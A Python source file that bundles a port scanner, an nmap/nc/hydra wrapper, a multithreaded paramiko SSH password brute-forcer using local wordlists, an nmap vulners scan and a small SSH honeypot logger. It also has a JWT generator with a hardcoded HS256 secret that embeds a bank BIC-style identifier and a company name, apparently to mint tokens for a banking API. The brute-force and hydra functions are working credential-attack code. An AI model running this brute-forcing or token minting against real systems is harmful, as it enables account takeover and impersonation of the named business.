import socket, subprocess, csv, os, json, paramiko, threading, queue, jwt, requests
from datetime import datetime, timezone, timedelta
from faker import Faker
import nmap
import subprocess

fake = Faker()

def scan_ports(ip, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port+1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
    report = {"ip": ip, "open_ports": open_ports, "timestamp": datetime.now().isoformat()}
    return report

def advanced_scan(data):
    ip = data.get('ip')
    ports = map(int, data.get('ports').split(','))
    selected_tools = data.get('tools').split(',')
    users_file = data.get('users_file')
    passwords_file = data.get('passwords_file')
    results = {}

    for port in ports:
        results[port] = {}
        for tool in selected_tools:
            cmd = {
                "nmap": ["nmap", "-sV", "-p", str(port), ip],
                "nc": ["nc", "-zv", ip, str(port)],
                "hydra": ["hydra", "-L", users_file, "-P", passwords_file, ip, "ssh", "-s", str(port)]
            }.get(tool, [])
            if cmd:
                proc = subprocess.run(cmd, capture_output=True, text=True)
                results[port][tool] = proc.stdout.strip()
    
    return {"ip": ip, "results": results, "timestamp": datetime.now().isoformat()}

def ssh_brute_force(ip, port, threads):
    q = queue.Queue()
    found = False
    lock = threading.Lock()
    creds = None  # inicialización correcta aquí

    users_path = '/home/markmur88/Documentos/GitHub/api_bank_h2/temp/scripts/automate/diccionarios/diccionarios/users'
    passwords_path = '/home/markmur88/Documentos/GitHub/api_bank_h2/temp/scripts/automate/diccionarios/diccionarios/passwords'

    with open(users_path) as u, open(passwords_path) as p:
        users = [line.strip() for line in u]
        passwords = [line.strip() for line in p]

    for user in users:
        for pwd in passwords:
            q.put((user, pwd))

    def worker():
        nonlocal found, creds
        while not q.empty() and not found:
            user, pwd = q.get()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, port=port, username=user, password=pwd, timeout=3)
                with lock:
                    found = True
                    creds = f"{ip}:{port} - {user}:{pwd}"
                client.close()
            except:
                client.close()
            finally:
                q.task_done()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    return {"success": found, "credentials": creds if found else None}


def generate_jwt(type_jwt):
    if type_jwt == "RSA":
        private_key_path = 'private.pem'
        if not os.path.exists(private_key_path):
            key = paramiko.RSAKey.generate(2048)
            key.write_private_key_file(private_key_path)
        with open(private_key_path, 'r') as f:
            private_key = f.read()
        payload = {'user_id': '090512DEUTDEFFXXX886479', 'iat': datetime.now(timezone.utc), 'exp': datetime.now(timezone.utc) + timedelta(hours=24)}
        token = jwt.encode(payload, private_key, algorithm='RS256')
    else:
        secret_key = 'bar1588623'
        payload = {'sub': '090512DEUTDEFFXXX886479', 'name': 'MIRYA TRADING CO LTD', 'iat': datetime.now(timezone.utc), 'exp': datetime.now(timezone.utc) + timedelta(hours=24)}
        token = jwt.encode(payload, secret_key, algorithm='HS256')
    return token

def vulnerability_analysis(target, report_dir):
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-sV --script vulners')
    data = nm[target]['tcp']
    vulnerabilities = []
    for port in data:
        vulns = data[port].get('script', {}).get('vulners', 'No vulnerabilities')
        vulnerabilities.append({"port": port, "service": data[port]['name'], "vulns": vulns})

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    folder = f"{target}_{timestamp}"
    path = os.path.join(report_dir, folder)
    os.makedirs(path, exist_ok=True)

    report_json = {"target": target, "timestamp": timestamp, "vulnerabilities": vulnerabilities}
    with open(os.path.join(path, 'report.json'), 'w') as f:
        json.dump(report_json, f, indent=2)

    report_txt_path = os.path.join(path, 'report.txt')
    with open(report_txt_path, 'w') as f:
        f.write(f"Reporte de Vulnerabilidades para {target} - {timestamp}\n\n")
        for v in vulnerabilities:
            f.write(f"Puerto {v['port']} ({v['service']}):\n{v['vulns']}\n\n")

    return report_json, folder

def init_honeypot(log_file):
    ip, ports = "0.0.0.0", [2222, 8000]

    def log_attempt(ip_client, port, protocol, info):
        with open(log_file, 'a', newline='') as f:
            csv.writer(f).writerow([datetime.now().isoformat(), ip_client, port, protocol, info])

    def handle_client(client, address, port):
        if port == 2222:
            banner = b"SSH-2.0-OpenSSH_7.9p1 Debian\r\n"
            try:
                client.sendall(banner)
                data = client.recv(1024).decode()
                log_attempt(address[0], port, "SSH", data.strip())
            finally:
                client.close()
        else:
            client.close()

    def start_listener(port):
        free_port(port)  # Libera el puerto antes de iniciar el socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen()
        while True:
            client, addr = s.accept()
            threading.Thread(target=handle_client, args=(client, addr, port)).start()

    if os.path.exists(log_file):
        os.remove(log_file)
    with open(log_file, 'w', newline='') as f:
        csv.writer(f).writerow(["timestamp", "ip", "port", "protocol", "info"])

    for port in ports:
        threading.Thread(target=start_listener, args=(port,), daemon=True).start()

def free_port(port):
    subprocess.run(f"fuser -k {port}/tcp", shell=True, stderr=subprocess.DEVNULL)

def find_free_port(start=5000, end=5100):
    for p in range(start, end):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('0.0.0.0', p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free ports found")
  
  